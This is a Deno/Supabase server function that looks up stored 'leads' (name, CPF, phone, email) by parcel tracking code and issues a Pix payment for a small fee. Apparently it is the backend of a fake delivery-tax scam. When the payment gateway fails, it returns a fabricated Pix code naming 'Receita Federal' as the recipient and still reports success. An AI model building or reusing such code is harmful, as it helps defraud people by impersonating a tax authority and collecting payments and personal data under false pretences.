import { serve } from "https://deno.land/std@0.190.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.45.0'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders })

  try {
    const { trackingCode, amount = 15.90 } = await req.json();
    const supabase = createClient(Deno.env.get('SUPABASE_URL') ?? '', Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '');

    const { data: lead } = await supabase.from('leads').select('*').eq('codigo_rastreio', trackingCode).maybeSingle();
    const clientName = lead?.nome || "Cliente Identificado";
    const clientDoc = (lead?.cpf || "12345678909").replace(/\D/g, '');
    const clientTel = (lead?.telefone || "11999999999").replace(/\D/g, '');
    const clientEmail = lead?.email || "cliente@email.com";

    const apiKey = Deno.env.get('ROYALBANKING_API_KEY');

    const generateMockPix = async () => {
      const mockId = `mock_tax_${amount}_${Date.now()}`;
      const mockPix = `00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865405${amount.toFixed(2)}5802BR5913Receita Federal6008Brasilia62140510TAXA${Date.now()}6304A1B2`;
      await supabase.from('pix_gateway_payments').upsert({
        id_transaction: mockId,
        status: 'pending',
        raw_payload: { trackingCode, amount, isFallback: true }
      });
      return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    };

    if (!apiKey) return await generateMockPix();

    try {
      const response = await fetch("https://api.royalbanking.com.br/v1/gateway/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          "api-key": apiKey,
          "amount": amount,
          "client": { "name": clientName, "document": clientDoc, "telefone": clientTel, "email": clientEmail },
          "callbackUrl": "https://ulrigywayovxuyiktnlr.supabase.co/functions/v1/royal-banking-webhook"
        })
      });
      const data = await response.json();
      if (!response.ok || data.status !== 'success') return await generateMockPix();

      await supabase.from('pix_gateway_payments').upsert({
        id_transaction: data.idTransaction,
        status: 'pending',
        raw_payload: { trackingCode, amount }
      });

      return new Response(JSON.stringify({ success: true, pixCopiaECola: data.paymentCode, idTransaction: data.idTransaction }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    } catch {
      return await generateMockPix();
    }
  } catch (error: any) {
    return new Response(JSON.stringify({ error: error.message }), { headers: corsHeaders, status: 500 });
  }
})